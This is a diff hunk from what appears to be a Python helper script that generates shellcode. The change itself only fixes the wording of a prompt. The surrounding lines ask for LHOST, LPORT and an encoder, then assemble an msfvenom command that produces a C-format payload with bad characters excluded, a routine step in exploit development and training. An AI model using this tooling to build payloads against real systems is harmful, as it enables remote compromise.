@@ -446,7 +446,7 @@ Which payload do you want to generate?\n
     LHOST = lhost_ip()
     global LPORT
     LPORT = input(BLUE+'Give your LPORT= '+END)
-    encoder =  input(BLUE+'Now if you can specify an encoder (e.g. x86/alpha_mixed), otherwise msfvenom will manage it:'+END).strip()
+    encoder =  input(BLUE+'Now you can specify an encoder (e.g. x86/alpha_mixed), otherwise msfvenom will manage it:'+END).strip()
     if encoder != "": encoder = " -e " + encoder
     payL = f"msfvenom -p {p_type} LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\"" + encoder + " -f c"
     print("I am using the following command to generate the payload")
